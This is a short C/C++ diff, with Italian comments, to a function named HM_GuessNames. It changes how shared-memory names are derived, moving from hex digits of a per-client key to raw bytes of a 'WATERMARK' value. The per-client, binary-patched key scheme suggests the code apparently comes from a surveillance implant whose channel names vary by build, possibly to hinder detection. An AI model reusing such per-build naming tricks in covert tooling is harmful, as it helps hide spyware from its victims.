@@ -1638,13 +1638,16 @@ BOOL HM_GuessNames()
 
 	// Genera i nomi della shared memory in base alla chiave per-cliente
 	// XXX Verificare sempre che la chiave NON sia quella embeddata nel codice, maquella binary-patched
-	BYTE *temp_arr = (BYTE *)CLIENT_KEY;
+	BYTE *temp_arr = (BYTE *)WATERMARK;
 	BYTE ckey_arr[16];
 	for (int j=0; j<16; j++)
 		ckey_arr[j] = temp_arr[j];
-	_snprintf_s(SHARE_MEMORY_READ_NAME, MAX_RAND_NAME, _TRUNCATE, "%s%02X%02X%02X%02X", SHARE_MEMORY_READ_BASENAME, ckey_arr[0], ckey_arr[1], ckey_arr[2], ckey_arr[3]);
-	_snprintf_s(SHARE_MEMORY_WRITE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s%02X%02X%02X%02X", SHARE_MEMORY_WRITE_BASENAME, ckey_arr[0], ckey_arr[1], ckey_arr[2], ckey_arr[3]);
-	_snprintf_s(SHARE_MEMORY_ASP_COMMAND_NAME, MAX_RAND_NAME, _TRUNCATE, "%s%02X%02X%02X%02X", SHARE_MEMORY_ASP_COMMAND_BASENAME, ckey_arr[0], ckey_arr[1], ckey_arr[2], ckey_arr[3]);
+	ckey_arr[8] = 0;
+	_snprintf_s(SHARE_MEMORY_READ_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
+	ckey_arr[7] = 0;
+	_snprintf_s(SHARE_MEMORY_WRITE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
+	ckey_arr[6] = 0;
+	_snprintf_s(SHARE_MEMORY_ASP_COMMAND_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
 
 	return TRUE;
 }
